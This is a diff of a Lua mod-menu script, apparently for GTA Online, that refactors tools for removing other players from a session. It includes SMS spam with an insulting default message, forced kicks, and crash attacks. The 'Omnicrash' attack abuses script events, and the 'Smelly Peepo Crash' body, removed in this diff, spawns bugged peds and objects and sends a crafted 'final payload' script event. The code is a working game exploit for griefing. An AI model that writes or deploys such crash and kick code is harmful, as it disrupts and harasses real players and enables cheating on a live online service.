@@ -1268,11 +1358,9 @@ function setup_player(player_id)
             {x = math.random(-5, 5), y = math.random(-5, 5), z = 0}
         )
 
-        --local pole = util.joaat("prop_fnccorgm_02pole"); request_model(pole)
         local el_rubio = util.joaat("csb_juanstrickler"); request_model(el_rubio)
         request_animations("mini@strip_club@pole_dance@pole_dance1")
 
-        --local object = entities.create_object(pole, object_coords)
         local ped = entities.create_ped(1, el_rubio, ped_coords, ENTITY.GET_ENTITY_HEADING(player_get_ped(player_id)))
         STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(el_rubio)
         HUD.ADD_BLIP_FOR_ENTITY(ped)
@@ -1291,112 +1379,52 @@ function setup_player(player_id)
 
     -- Removal --
     -- -- Text & Kick
-    local text_kick_root = menu.list(player_removal_root, "Text & Kick...", {"ryantextkick"}, "Kicks the player after spamming them with texts.")
-    local text_kick_duration = 6000
-    local text_kick_block_joins = false
-    local text_kick_message = "See you later, child baiter."
-    menu.text_input(text_kick_root, "Message", {"ryantextkickmessage"}, "The message to spam before kicking.", function(value)
-        text_kick_message = value
-    end, text_kick_message)
-    menu.slider(text_kick_root, "Text Spam Duration", {"ryantextkickduration"}, "Duration in milliseconds of text spam.", 5000, 10000, 6000, 500, function(value)
-        text_kick_duration = value
-    end)
-    menu.toggle(text_kick_root, "Block Joins", {"ryantextkickblockjoins"}, "Block joins by this player.", function(value)
-        text_kick_block_joins = value
-    end)
-    menu.action(text_kick_root, "Go", {"ryantextkickgo"}, "Start the text & kick.", function()
-        local player_name = PLAYER.GET_PLAYER_NAME(player_id)
-        
-        util.toast("Spamming " .. player_name .. " with texts...")
-        do_sms_spam(player_id, text_kick_message, text_kick_duration)
-
-        util.toast("Kicking " .. player_name .. "!")
-        if text_kick_block_joins then
-            player_block(player_name)
-        end
-        menu.trigger_commands("kick" .. player_name)
-        util.yield()
-        menu.trigger_commands("breakup" .. player_name)
-        menu.trigger_commands("players")
+    local removal_block_joins = false
+    local removal_message = ""
+    
+    menu.text_input(player_removal_root, "Spam Message", {"ryanremovalspam"}, "The message to spam before kicking.", function(value)
+        removal_message = value
+    end, removal_message)
+    menu.toggle(player_removal_root, "Block Joins", {"ryanremovalblockjoins"}, "Block joins by this player.", function(value)
+        removal_block_joins = value
     end)
 
-    -- -- Omnicrash
+    menu.divider(player_removal_root, "Go")
+    -- -- Stand Kick
+    menu.action(player_removal_root, "Stand Kick", {"ryanstandkick"}, "Attempts to kick using Stand's Smart and Breakup kicks.", function()
+        spam_and_block_then(player_id, removal_block_joins, removal_message, function()
+            local player_name = PLAYER.GET_PLAYER_NAME(player_id)
+            menu.trigger_commands("kick" .. player_name)
+            util.yield()
+            menu.trigger_commands("breakup" .. player_name)
+        end)
+    end)
+
+    -- -- Omnicrash (Credit: various artists)
     menu.action(player_removal_root, "Omnicrash Mk II", {"ryanomnicrash"}, "Attempts to crash using all known script events.", function()
-        do_omnicrash(player_id)
+        spam_and_block_then(player_id, removal_block_joins, removal_message, function()
+            do_omnicrash(player_id)
+        end)
     end)
 
     -- -- Smelly Peepo Crash (Credit: 2take1 Additions, Keramis Script)
     menu.action(player_removal_root, "Smelly Peepo Crash", {"ryansmellypeepo"}, "Attempts to crash using invalid and bugged peds.", function(click_type)
         local smelly_peepo_ref = menu.ref_by_command_name("ryansmellypeepo" .. PLAYER.GET_PLAYER_NAME(player_id):lower())
         menu.show_warning(smelly_peepo_ref, click_type, "If you are near this player, you will crash too. Be sure you are far enough away before pressing Proceed.", function()
-            show_text_message(Colors.Purple, "Smelly Peepo Crash", "Smelly Peepo Crash has begun. This may take a while...")
-        
-            local player_ped = player_get_ped(player_id)
-            local player_ped_heading = ENTITY.GET_ENTITY_HEADING(player_ped)
-            local player_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
-
-            util.toast("Spawning smelly objects on " .. PLAYER.GET_PLAYER_NAME(player_id))
-            request_model(-930879665)
-            request_model(3613262246)
-            request_model(452618762)
-            local object_1 = entities.create_object(-930879665, player_coords)
-            util.yield(10)
-            local object_2 = entities.create_object(3613262246, player_coords)
-            util.yield(10)
-            local object_3 = entities.create_object(452618762, player_coords)
-            util.yield(10)
-            local object_4 = entities.create_object(3613262246, player_coords)
-            util.yield(300)
-            entities.delete_by_handle(object_1)
-            entities.delete_by_handle(object_2)
-            entities.delete_by_handle(object_3)
-            entities.delete_by_handle(object_4)
-
-            util.toast("Spawning smelly peds on " .. PLAYER.GET_PLAYER_NAME(player_id) .. "...")
-            local ped = entities.create_ped(0, 1057201338, player_coords, 0)
-            util.yield(100)
-            entities.delete_by_handle(ped)
-            local ped = entities.create_ped(0, -2056455422, player_coords, 0)
-            util.yield(100)
-            entities.delete_by_handle(ped)
-            local ped = entities.create_ped(0, 762327283, player_coords, 0)
-            util.yield(100)
-            entities.delete_by_handle(ped)
-
-            util.toast("Spawning the smelliest of peds on " .. PLAYER.GET_PLAYER_NAME(player_id) .. "!")
-            local fatcult = util.joaat("a_f_m_fatcult_01"); request_model(fatcult)
-            for i = 1, 8 do
-                util.create_thread(function()
-                    local ped = entities.create_ped(
-                        0, fatcult,
-                        vector_add(player_coords, {x = math.random(-1, 1), y = math.random(-1, 1), z = 0}),
-                        player_ped_heading
-                    )
-                    util.yield(400)
-                    entities.delete_by_handle(ped)
-                end)
-                util.yield(100)
-                local ped_1 = entities.create_ped(0, util.joaat("slod_human"), player_coords, player_ped_heading)
-                local ped_2 = entities.create_ped(0, util.joaat("slod_large_quadped"), player_coords, player_ped_heading)
-                local ped_3 = entities.create_ped(0, util.joaat("slod_small_quadped"), player_coords, player_ped_heading)
-                util.yield(750)
-                entities.delete_by_handle(ped_1)
-                entities.delete_by_handle(ped_2)
-                entities.delete_by_handle(ped_3)
-                player_send_script_event(player_id, {962740265, player_id, 23243, 5332, 3324, player_id}, "final payload")
-            end
-            util.toast("Done!")
+            spam_and_block_then(player_id, removal_block_joins, removal_message, function()
+                do_smelly_peepo_crash(player_id)
+            end)
         end)
     end)
 
 
     -- Divorce Kick --
     menu.action(player_root, "Divorce", {"ryandivorce"}, "Kicks the player, then blocks future joins by them.", function()
-        local player = PLAYER.GET_PLAYER_NAME(player_id)
-        player_block_joins(player)
-        menu.trigger_commands("kick" .. player)
+        local player_name = PLAYER.GET_PLAYER_NAME(player_id)
+        player_block_joins(player_name)
+        menu.trigger_commands("kick" .. player_name)
         util.yield()
-        menu.trigger_commands("breakup" .. player)
+        menu.trigger_commands("breakup" .. player_name)
         menu.trigger_commands("players")
     end)
 end
